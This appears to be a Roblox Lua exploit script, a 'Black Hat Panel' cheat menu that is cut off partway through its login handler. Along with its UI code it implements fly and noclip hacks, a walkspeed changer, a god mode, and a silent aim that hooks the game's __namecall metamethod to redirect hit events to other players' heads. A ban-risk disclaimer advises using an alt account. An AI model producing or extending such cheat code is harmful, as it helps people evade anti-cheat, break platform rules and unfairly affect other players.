Title.BorderSizePixel = 0
Title.Position = UDim2.new(-0.00165016507, 0, 0, 0)
Title.Size = UDim2.new(0, 608, 0, 50)
Title.Font = Enum.Font.SciFi
Title.Text = "Black Hat Panel"
Title.TextColor3 = Color3.fromRGB(85, 255, 0)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

MakeSure.Name = "MakeSure"
MakeSure.Parent = Executer
MakeSure.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MakeSure.BackgroundTransparency = 1.000
MakeSure.BorderSizePixel = 0
MakeSure.Position = UDim2.new(0.280528039, 0, 0.680473387, 0)
MakeSure.Size = UDim2.new(0, 278, 0, 50)
MakeSure.Font = Enum.Font.SourceSansBold
MakeSure.Text = "Are You Sure?"
MakeSure.TextColor3 = Color3.fromRGB(255, 255, 255)
MakeSure.TextScaled = true
MakeSure.TextSize = 14.000
MakeSure.TextWrapped = true

MakeSureText.Name = "MakeSureText"
MakeSureText.Parent = Executer
MakeSureText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MakeSureText.BackgroundTransparency = 1.000
MakeSureText.BorderSizePixel = 0
MakeSureText.Position = UDim2.new(0, 0, 0.745562136, 0)
MakeSureText.Size = UDim2.new(0, 606, 0, 105)
MakeSureText.Font = Enum.Font.Gotham
MakeSureText.Text = "If you \"Execute\" maybe theres a little chance to get banned by the anti cheat or getting banned in roblox, we aren't sure if that happens but use it at your own risk! We aren't Responsible if you get banned for Cheating or you get warned by the Roblox Staff System (i guess) BUT If you are in your alt account maybe you can do it and just \"Execute\" but remember! Use it at your own risk or maybe you just regret for not using your alt account lol. Also Thanks For Reading! But if i wasted your time then i'm sorry but it was important to read this before doing \"Execute\" lmao."
MakeSureText.TextColor3 = Color3.fromRGB(255, 255, 255)
MakeSureText.TextScaled = true
MakeSureText.TextSize = 14.000
MakeSureText.TextWrapped = true

CloseButton.Name = "CloseButton"
CloseButton.Parent = Executer
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.Position = UDim2.new(0.935643554, 0, -0.0443786979, 0)
CloseButton.Size = UDim2.new(0, 59, 0, 66)
CloseButton.Font = Enum.Font.SourceSansItalic
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextScaled = true
CloseButton.TextSize = 14.000
CloseButton.TextWrapped = true

UICorner_33.CornerRadius = UDim.new(0, 30)
UICorner_33.Parent = CloseButton

Executing.Name = "Executing"
Executing.Parent = BlackHatPanelV132
Executing.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Executing.BorderColor3 = Color3.fromRGB(42, 42, 42)
Executing.BorderSizePixel = 8
Executing.Position = UDim2.new(0, 0, 0.439809293, 0)
Executing.Size = UDim2.new(0, 1327, 0, 100)
Executing.Visible = false
Executing.Active = true
Executing.Draggable = true

Loading.Name = "Loading"
Loading.Parent = Executing
Loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Loading.BackgroundTransparency = 1.000
Loading.BorderSizePixel = 0
Loading.Position = UDim2.new(0.390625, 0, 0.25, 0)
Loading.Size = UDim2.new(0, 279, 0, 50)
Loading.Font = Enum.Font.SciFi
Loading.Text = "Executing"
Loading.TextColor3 = Color3.fromRGB(85, 255, 0)
Loading.TextScaled = true
Loading.TextSize = 14.000
Loading.TextWrapped = true

Continue.Name = "Continue"
Continue.Parent = Executing
Continue.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Continue.BorderSizePixel = 0
Continue.Position = UDim2.new(0.421875, 0, 0.25, 0)
Continue.Size = UDim2.new(0, 200, 0, 50)
Continue.Visible = false
Continue.Font = Enum.Font.SciFi
Continue.Text = "Continue"
Continue.TextColor3 = Color3.fromRGB(85, 255, 0)
Continue.TextScaled = true
Continue.TextSize = 14.000
Continue.TextWrapped = true

UICorner_34.CornerRadius = UDim.new(0, 20)
UICorner_34.Parent = Continue

MainLogin.Name = "MainLogin"
MainLogin.Parent = BlackHatPanelV132
MainLogin.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
MainLogin.Position = UDim2.new(0, 248, 0, 148)
MainLogin.Size = UDim2.new(0, 800, 0, 541)
MainLogin.Active = true
MainLogin.Draggable = true

Sidebar.Name = "Sidebar"
Sidebar.Parent = MainLogin
Sidebar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Sidebar.Size = UDim2.new(0, 379, 0, 541)

HatPanelIcon.Name = "HatPanelIcon"
HatPanelIcon.Parent = Sidebar
HatPanelIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HatPanelIcon.BackgroundTransparency = 1.000
HatPanelIcon.BorderSizePixel = 0
HatPanelIcon.Position = UDim2.new(0.200527698, 0, 0.295748621, 0)
HatPanelIcon.Size = UDim2.new(0, 226, 0, 220)
HatPanelIcon.Image = "rbxassetid://10856831472"

HatPanelDescription.Name = "Hat PanelDescription"
HatPanelDescription.Parent = Sidebar
HatPanelDescription.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HatPanelDescription.BackgroundTransparency = 1.000
HatPanelDescription.BorderSizePixel = 0
HatPanelDescription.Position = UDim2.new(0.113456465, 0, 0.234750465, 0)
HatPanelDescription.Size = UDim2.new(0, 291, 0, 33)
HatPanelDescription.Font = Enum.Font.SciFi
HatPanelDescription.Text = "Design by Aim It                                                                                          Made by Aim It"
HatPanelDescription.TextColor3 = Color3.fromRGB(255, 255, 255)
HatPanelDescription.TextSize = 14.000
HatPanelDescription.TextWrapped = true

HatPanelText.Name = "Hat PanelText"
HatPanelText.Parent = Sidebar
HatPanelText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HatPanelText.BackgroundTransparency = 1.000
HatPanelText.BorderSizePixel = 0
HatPanelText.Position = UDim2.new(0.123526305, 0, 0.0783434138, 0)
HatPanelText.Size = UDim2.new(0, 282, 0, 92)
HatPanelText.Font = Enum.Font.SciFi
HatPanelText.Text = "Black Hat Panel"
HatPanelText.TextColor3 = Color3.fromRGB(0, 255, 0)
HatPanelText.TextScaled = true
HatPanelText.TextSize = 14.000
HatPanelText.TextWrapped = true

WelcomeText.Name = "WelcomeText"
WelcomeText.Parent = MainLogin
WelcomeText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WelcomeText.BackgroundTransparency = 1.000
WelcomeText.BorderSizePixel = 0
WelcomeText.Position = UDim2.new(0, 501, 0, 54)
WelcomeText.Size = UDim2.new(0, 200, 0, 50)
WelcomeText.Font = Enum.Font.GothamBold
WelcomeText.Text = "Welcome"
WelcomeText.TextColor3 = Color3.fromRGB(255, 255, 255)
WelcomeText.TextScaled = true
WelcomeText.TextSize = 14.000
WelcomeText.TextWrapped = true

PlayerName.Name = "PlayerName"
PlayerName.Parent = MainLogin
PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.BackgroundTransparency = 1.000
PlayerName.BorderSizePixel = 0
PlayerName.Position = UDim2.new(0, 573, 0, 135)
PlayerName.Size = UDim2.new(0, 200, 0, 50)
PlayerName.Font = Enum.Font.GothamMedium
PlayerName.Text = "Name"
PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.TextScaled = true
PlayerName.TextSize = 14.000
PlayerName.TextWrapped = true

ImageLabel_2.Parent = MainLogin
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.Position = UDim2.new(0, 461, 0, 119)
ImageLabel_2.Size = UDim2.new(0, 102, 0, 98)
ImageLabel_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_35.CornerRadius = UDim.new(0, 50)
UICorner_35.Parent = ImageLabel_2

LoginButton.Name = "LoginButton"
LoginButton.Parent = MainLogin
LoginButton.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
LoginButton.BorderSizePixel = 0
LoginButton.Position = UDim2.new(0, 458, 0, 391)
LoginButton.Size = UDim2.new(0, 283, 0, 50)
LoginButton.Font = Enum.Font.GothamMedium
LoginButton.Text = "Login"
LoginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
LoginButton.TextScaled = true
LoginButton.TextSize = 14.000
LoginButton.TextWrapped = true

UICorner_36.CornerRadius = UDim.new(0, 10)
UICorner_36.Parent = LoginButton

PassBox.Name = "PassBox"
PassBox.Parent = MainLogin
PassBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
PassBox.Position = UDim2.new(0, 460, 0, 266)
PassBox.Size = UDim2.new(0, 283, 0, 87)
PassBox.Font = Enum.Font.Gotham
PassBox.PlaceholderText = "Enter Password..."
PassBox.Text = ""
PassBox.TextColor3 = Color3.fromRGB(255, 255, 255)
PassBox.TextSize = 20.000
PassBox.TextWrapped = true

UICorner_37.CornerRadius = UDim.new(0, 100)
UICorner_37.Parent = PassBox

boi.Name = "boi"
boi.Parent = MainLogin
boi.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
boi.BackgroundTransparency = 1.000
boi.BorderSizePixel = 0
boi.Position = UDim2.new(0, 467, 0, 234)
boi.Size = UDim2.new(0, 134, 0, 31)
boi.Font = Enum.Font.Gotham
boi.Text = "Password"
boi.TextColor3 = Color3.fromRGB(255, 255, 255)
boi.TextScaled = true
boi.TextSize = 14.000
boi.TextWrapped = true

TextButton_2.Parent = MainLogin
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2.Position = UDim2.new(0, 761, 0, -33)
TextButton_2.Size = UDim2.new(0, 64, 0, 62)
TextButton_2.Font = Enum.Font.SourceSansItalic
TextButton_2.Text = "X"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UICorner_38.CornerRadius = UDim.new(0, 30)
UICorner_38.Parent = TextButton_2

WrongText.Name = "WrongText"
WrongText.Parent = MainLogin
WrongText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WrongText.BackgroundTransparency = 1.000
WrongText.BorderSizePixel = 0
WrongText.Position = UDim2.new(0, 468, 0, 353)
WrongText.Size = UDim2.new(0, 185, 0, 27)
WrongText.Visible = false
WrongText.Font = Enum.Font.SourceSansItalic
WrongText.Text = "Wrong password. Try again!"
WrongText.TextColor3 = Color3.fromRGB(255, 85, 127)
WrongText.TextScaled = true
WrongText.TextSize = 14.000
WrongText.TextWrapped = true

Notification.Name = "Notification"
Notification.Parent = MainLogin
Notification.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Notification.Position = UDim2.new(0, -248, 0, 433)
Notification.Size = UDim2.new(0, 221, 0, 139)

UICorner_39.CornerRadius = UDim.new(0, 20)
UICorner_39.Parent = Notification

Bar_3.Name = "Bar"
Bar_3.Parent = Notification
Bar_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar_3.BorderColor3 = Color3.fromRGB(99, 99, 99)
Bar_3.Position = UDim2.new(0.420725584, 0, 0.20287779, 0)
Bar_3.Size = UDim2.new(0, 0, 0.7971223, 0)

Decoration.Name = "Decoration"
Decoration.Parent = Notification
Decoration.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Decoration.BorderSizePixel = 0
Decoration.Size = UDim2.new(0, 18, 0, 139)

Bar_4.Name = "Bar"
Bar_4.Parent = Decoration
Bar_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar_4.BorderColor3 = Color3.fromRGB(99, 99, 99)
Bar_4.Position = UDim2.new(-8.89290532e-05, 0, 0.20287779, 0)
Bar_4.Size = UDim2.new(0, 221, 0, 0)

Icon.Name = "Icon"
Icon.Parent = Notification
Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icon.BackgroundTransparency = 1.000
Icon.BorderSizePixel = 0
Icon.Position = UDim2.new(0, 0, 0.208633095, 0)
Icon.Size = UDim2.new(0, 92, 0, 101)
Icon.Image = "rbxassetid://10287033603"

Desc.Name = "Desc"
Desc.Parent = Notification
Desc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Desc.BackgroundTransparency = 1.000
Desc.BorderSizePixel = 0
Desc.Position = UDim2.new(0.420725554, 0, 0.208633095, 0)
Desc.Size = UDim2.new(0, 128, 0, 101)
Desc.Font = Enum.Font.Gotham
Desc.Text = "Succesfully Executed Black Hat Panel Version 1.3.2"
Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc.TextScaled = true
Desc.TextSize = 14.000
Desc.TextWrapped = true

TitleText.Name = "TitleText"
TitleText.Parent = Notification
TitleText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleText.BackgroundTransparency = 1.000
TitleText.BorderSizePixel = 0
TitleText.Position = UDim2.new(0, 0, -0.00719424477, 0)
TitleText.Size = UDim2.new(0, 220, 0, 29)
TitleText.Font = Enum.Font.GothamMedium
TitleText.Text = "Executed"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextScaled = true
TitleText.TextSize = 14.000
TitleText.TextWrapped = true

CheckingText.Name = "CheckingText"
CheckingText.Parent = MainLogin
CheckingText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CheckingText.BackgroundTransparency = 1.000
CheckingText.BorderSizePixel = 0
CheckingText.Position = UDim2.new(0.623750031, 0, 0.853974104, 0)
CheckingText.Size = UDim2.new(0, 200, 0, 50)
CheckingText.Visible = false
CheckingText.Font = Enum.Font.SourceSansItalic
CheckingText.Text = "..."
CheckingText.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckingText.TextScaled = true
CheckingText.TextSize = 14.000
CheckingText.TextWrapped = true

ErrorText.Name = "ErrorText"
ErrorText.Parent = MainLogin
ErrorText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ErrorText.BackgroundTransparency = 1.000
ErrorText.BorderSizePixel = 0
ErrorText.Position = UDim2.new(0.5625, 0, 0.722735703, 0)
ErrorText.Size = UDim2.new(0, 291, 0, 17)
ErrorText.Visible = false
ErrorText.Font = Enum.Font.SciFi
ErrorText.Text = "Error:"
ErrorText.TextColor3 = Color3.fromRGB(255, 0, 0)
ErrorText.TextSize = 24.000
ErrorText.TextStrokeTransparency = 0.000
ErrorText.TextWrapped = true
ErrorText.TextYAlignment = Enum.TextYAlignment.Top

DetectedText.Name = "DetectedText"
DetectedText.Parent = ErrorText
DetectedText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DetectedText.BackgroundTransparency = 1.000
DetectedText.BorderSizePixel = 0
DetectedText.Position = UDim2.new(0, 0, 1, 0)
DetectedText.Size = UDim2.new(0, 291, 0, 50)
DetectedText.Font = Enum.Font.SourceSansLight
DetectedText.Text = "Too many CPS!"
DetectedText.TextColor3 = Color3.fromRGB(255, 255, 255)
DetectedText.TextScaled = true
DetectedText.TextSize = 14.000
DetectedText.TextStrokeTransparency = 0.000
DetectedText.TextWrapped = true

-- Scripts:

local function JWBFB_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local main = script.parent.Parent.Parent.BlackHatPanel
	
	script.Parent.MouseButton1Click:Connect(function()
		main.Visible = false
	end)
end
coroutine.wrap(JWBFB_fake_script)()
local function ZMCNR_fake_script() -- Next.LocalScript 
	local script = Instance.new('LocalScript', Next)

	local frame = script.parent.Parent.Parent.Home2
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		end
	end)
end
coroutine.wrap(ZMCNR_fake_script)()
local function WYMA_fake_script() -- Credits.LocalScript 
	local script = Instance.new('LocalScript', Credits)

	local frame = script.Parent.Parent.CreditsLol
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		else
			frame.Visible = false
		end
	end)
	
end
coroutine.wrap(WYMA_fake_script)()
local function ODMA_fake_script() -- MapDestroyer.LocalScript 
	local script = Instance.new('LocalScript', MapDestroyer)

	local frame = script.Parent.Parent.MapDestroyerLol
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		else
			frame.Visible = false
		end
	end)
	
end
coroutine.wrap(ODMA_fake_script)()
local function DQDF_fake_script() -- Home.LocalScript 
	local script = Instance.new('LocalScript', Home)

	local Home = script.Parent.Parent.HomeLol
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Home.Visible == false then
			Home.Visible = true
		else
			Home.Visible = false
		end
	end)
end
coroutine.wrap(DQDF_fake_script)()
local function KMGR_fake_script() -- FlyHack.LocalScript 
	local script = Instance.new('LocalScript', FlyHack)

	-- this script isn't mine
	
	script.Parent.MouseButton1Click:Connect(function()
		repeat wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0
	
		function Fly()
			local bg = Instance.new("BodyGyro", torso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = torso.CFrame
			local bv = Instance.new("BodyVelocity", torso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			repeat wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+.5+(speed/maxspeed)
					if speed > maxspeed then
						speed = maxspeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-1
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
			if key:lower() == "e" then
				if flying then flying = false
				else
					flying = true
					Fly()
				end
			elseif key:lower() == "w" then
				ctrl.f = 1
			elseif key:lower() == "s" then
				ctrl.b = -1
			elseif key:lower() == "a" then
				ctrl.l = -1
			elseif key:lower() == "d" then
				ctrl.r = 1
			end
		end)
		mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
			elseif key:lower() == "s" then
				ctrl.b = 0
			elseif key:lower() == "a" then
				ctrl.l = 0
			elseif key:lower() == "d" then
				ctrl.r = 0
			end
		end)
		Fly()
	end)
end
coroutine.wrap(KMGR_fake_script)()
local function TJNUD_fake_script() -- Reset.LocalScript 
	local script = Instance.new('LocalScript', Reset)

	local function reset()
		
		local Humanoid = game.Players.LocalPlayer.Character.Humanoid
		
		Humanoid.Health = 0
		
	end
	
	script.Parent.MouseButton1Click:Connect(function()
		reset()
	end)
end
coroutine.wrap(TJNUD_fake_script)()
local function HAKV_fake_script() -- WalkSpeedButton.LocalScript 
	local script = Instance.new('LocalScript', WalkSpeedButton)

	local WalkSpeedBox = script.parent.Parent.WalkSpeedBox
	
	script.Parent.MouseButton1Click:Connect(function()
		
		local Humanoid = game.Players.LocalPlayer.Character.Humanoid
		
		Humanoid.WalkSpeed = (WalkSpeedBox.Text)
	end)
end
coroutine.wrap(HAKV_fake_script)()
local function NBDXIDQ_fake_script() -- NoclipHack.Noclip 
	local script = Instance.new('LocalScript', NoclipHack)

	--USER VARIABLES - THESE ARE STUDS PER 0.016 SECONDS--
	-- This script isn't mine
	
	Slow = 2
	Fast = 5
	
	NOCLIPKEY = "v"
	
	--END USER VARIABLES--
	
	inc = Slow
	w = false
	a = false
	s = false
	d = false
	q = false
	e = false
	sel = false
	noclip = false
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	repeat
		wait()
		Character = Player.Character
	until Character
	
	local Run = game:GetService("RunService")
	
	local Torso = Character.Torso
	local Mouse = Player:GetMouse()
	
	Mouse.KeyDown:connect(function (k)
		if k == NOCLIPKEY then
			noclip = not noclip
		end
		if noclip then
			if k == "w" then
				w = true
			end
			if k == "a" then
				a = true
			end
			if k == "s" then
				s = true
			end
			if k == "d" then
				d = true
			end
			if k == "q" then
				q = true
			end
			if k == "e" then
				e = true
			end
			if string.byte(k) == 48 then
				inc = Fast
			end
		else
			w = false
			a = false
			s = false
			d = false
			q = false
			e = false
			sel = false
		end
	end)
	Mouse.KeyUp:connect(function (k)
		if noclip then
			if k == "w" then
				w = false
			end
			if k == "a" then
				a = false
			end
			if k == "s" then
				s = false
			end
			if k == "d" then
				d = false
			end
			if k == "q" then
				q = false
			end
			if k == "e" then
				e = false
			end
			if string.byte(k) == 48 then
				inc = Slow
			end
		else
			w = false
			a = false
			s = false
			d = false
			q = false
			e = false
			sel = false
		end
	end)
	
	coroutine.resume(coroutine.create(function ()
		Run.RenderStepped:connect(function ()
			Torso.Anchored = noclip
			Character.Humanoid.PlatformStand = noclip
			if w then
				Torso.CFrame = Torso.CFrame * CFrame.new(0, 0, -inc)
			end
			if a then
				Torso.CFrame = Torso.CFrame * CFrame.new(-inc, 0, 0)
			end
			if s then
				Torso.CFrame = Torso.CFrame * CFrame.new(0, 0, inc)
			end
			if d then
				Torso.CFrame = Torso.CFrame * CFrame.new(inc, 0, 0)
			end
			if q then
				Torso.CFrame = Torso.CFrame * CFrame.new(0, -inc ,0)
			end
			if e then
				Torso.CFrame = Torso.CFrame * CFrame.new(0, inc, 0)
			end
			if noclip then
				Torso.CFrame = CFrame.new(Torso.CFrame.p, workspace.CurrentCamera.CoordinateFrame * CFrame.new(0, 0, -1000).p)
			end
		end)
	end))
end
coroutine.wrap(NBDXIDQ_fake_script)()
local function BVMHGSD_fake_script() -- SilentAimHack.LocalScript 
	local script = Instance.new('LocalScript', SilentAimHack)

	-- This script isn't mine
	
	script.Parent.MouseButton1Click:Connect(function()
		local players = game:GetService("Players")
		local plr = players.LocalPlayer
		local mouse = plr:GetMouse()
		local camera = game.Workspace.CurrentCamera
		local teamcheck = false
	
		local function ClosestPlayerToMouse()
			local target = nil
			local dist = math.huge
			for i,v in pairs(players:GetPlayers()) do
				if v.Name ~= plr.Name then
					if v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") and teamcheck and v.TeamColor ~= plr.TeamColor then
						local screenpoint = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
						local check = (Vector2.new(mouse.X,mouse.Y)-Vector2.new(screenpoint.X,screenpoint.Y)).magnitude
	
						if check < dist then
							target  = v
							dist = check
						end
					end
				end
			end
	
			return target 
		end
	
		local mt = getrawmetatable(game)
		local namecall = mt.__namecall
		setreadonly(mt,false)
	
		mt.__namecall = function(self,...)
			local args = {...}
			local method = getnamecallmethod()
	
			if tostring(self) == "HitPart" and method == "FireServer" then
				args[1] = ClosestPlayerToMouse().Character.Head
				args[2] = ClosestPlayerToMouse().Character.Head.Position
				return self.FireServer(self, unpack(args))
			end
			return namecall(self,...)
		end
	end)
end
coroutine.wrap(BVMHGSD_fake_script)()
local function DJKUPBN_fake_script() -- God.LocalScript 
	local script = Instance.new('LocalScript', God)

	local function God()
		
		local Humanoid = game.Players.LocalPlayer.Character.Humanoid
		
		Humanoid.MaxHealth = 4750923789
		
		Humanoid.Health = 4750923789
		
	end
	
	script.Parent.MouseButton1Click:Connect(function()
		God()
	end)
end
coroutine.wrap(DJKUPBN_fake_script)()
local function ZMNIP_fake_script() -- WalkSpeedBox.LocalScript 
	local script = Instance.new('LocalScript', WalkSpeedBox)

	local TextBox = script.parent.Parent.WalkSpeedBox
	
	TextBox:GetPropertyChangedSignal("Text"):Connect(function()
		TextBox.Text = TextBox.Text:gsub("[^%d%.%-]", '')
	end)
end
coroutine.wrap(ZMNIP_fake_script)()
local function BLYZW_fake_script() -- Normalspeed.LocalScript 
	local script = Instance.new('LocalScript', Normalspeed)

	local function Normalwalkspeed()
		
		local Humanoid = game.Players.LocalPlayer.Character.Humanoid
		
		Humanoid.WalkSpeed = 16
		
	end
	
	script.Parent.MouseButton1Click:Connect(function()
		Normalwalkspeed()
	end)
end
coroutine.wrap(BLYZW_fake_script)()
local function UZQIBH_fake_script() -- Back.LocalScript 
	local script = Instance.new('LocalScript', Back)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Home2.Visible = false
	end)
end
coroutine.wrap(UZQIBH_fake_script)()
local function EUMMLR_fake_script() -- Hacks.LocalScript 
	local script = Instance.new('LocalScript', Hacks)

	local frame = script.Parent.Parent.HacksLol
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		else
			frame.Visible = false
		end
	end)
	
end
coroutine.wrap(EUMMLR_fake_script)()
local function BRUJBXI_fake_script() -- OpenButton.LocalScript 
	local script = Instance.new('LocalScript', OpenButton)

	local frame = script.Parent.Parent.BlackHatPanel
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		end
	end)
end
coroutine.wrap(BRUJBXI_fake_script)()
local function OXJFOX_fake_script() -- Execute.LocalScript 
	local script = Instance.new('LocalScript', Execute)

	local Executing = script.parent.Parent.Parent.Executing
	local melol = script.parent.Parent.Parent.Executer
	
	local function SelfDestroy() -- I don't know why but don't ask
		melol:Destroy()
	end
	
	script.Parent.MouseButton1Click:Connect(function()
		if Executing.Visible == false then
			Executing.Visible = true
			print("Succesfully confirmed!")
			SelfDestroy()
		end
	end)
end
coroutine.wrap(OXJFOX_fake_script)()
local function EXUVRR_fake_script() -- CloseButton.LocalScript 
	local script = Instance.new('LocalScript', CloseButton)

	local Executer = script.Parent.Parent
	
	script.Parent.MouseButton1Click:Connect(function()
		Executer:Destroy()
	end)
end
coroutine.wrap(EXUVRR_fake_script)()
local function COQLB_fake_script() -- Continue.LocalScript 
	local script = Instance.new('LocalScript', Continue)

	local Executing = script.parent.Parent.Parent.Executing
	local OpenButton = script.parent.parent.Parent.OpenButton
	
	script.Parent.MouseButton1Click:Connect(function()
		if OpenButton.Visible == false then
			OpenButton.Visible = true
			Executing:Destroy()
		end
	end)
end
coroutine.wrap(COQLB_fake_script)()
local function IYZUSY_fake_script() -- Executing.AWSDJASJD 
	local script = Instance.new('LocalScript', Executing)

	local Loading = script.parent.Loading
	local Continue = script.parent.Continue
	local FrameExecuting = script.parent.Parent.Executing
	
	if FrameExecuting.Visible == true then
		Loading.Text = "Executing"
		wait(0.2)
		Loading.Text = "Executing."
		wait(0.2)
		Loading.Text = "Executing.."
		wait(0.2)
		Loading.Text = "Executing..."
		wait(0.2)
		Loading.Text = "Executing"
		wait(0.2)
		Loading.Text = "Executing."
		wait(0.2)
		Loading.Text = "Executing.."
		wait(0.2)
		Loading.Text = "Executing..."
		wait(0.2)
		Loading.Text = "Executing"
		wait(0.2)
		Loading.Text = "Executing."
		wait(0.2)
		Loading.Text = "Executing.."
		wait(0.2)
		Loading.Text = "Executing..."
		wait(0.2)
		Loading.Text = "Executing"
		wait(0.2)
		Loading.Text = "Executing."
		wait(0.2)
		Loading.Text = "Executing.."
		wait(0.2)
		Loading.Text = "Executing..."
		wait(0.2)
		Loading.Text = "Executing"
		wait(0.2)
		Loading.Text = "Executing."
		wait(0.2)
		Loading.Text = "Executing.."
		wait(0.2)
		Loading.Text = "Executing..."
		wait(0.2)
		Loading.Text = "Executed!"
	end
	
	wait(4)
	
	Loading.Visible = false
	
	if  Continue.Visible == false then
		Continue.Visible = true
	end
end
coroutine.wrap(IYZUSY_fake_script)()
local function VNXWEY_fake_script() -- PlayerName.LocalScript 
	local script = Instance.new('LocalScript', PlayerName)

	local player = game.Players.LocalPlayer
	
	if player then
		script.Parent.Text = ""..player.Name..""
	end
end
coroutine.wrap(VNXWEY_fake_script)()
local function KTIUT_fake_script() -- ImageLabel_2.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel_2)

	local Players = game:GetService("Players")
	
	local player = Players.LocalPlayer
	
	
	localuserId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	local content, isReady = Players:GetUserThumbnailAsync(localuserId, thumbType, thumbSize)
	
	
	local ImageLabel = script.Parent
	ImageLabel.Image = content
	
end
coroutine.wrap(KTIUT_fake_script)()
local function FECYQS_fake_script() -- LoginButton.LocalScript 
	local script = Instance.new('LocalScript', LoginButton)

	local wrong = script.parent.Parent.WrongText
	local MainLogin = script.parent.Parent.Parent.MainLogin
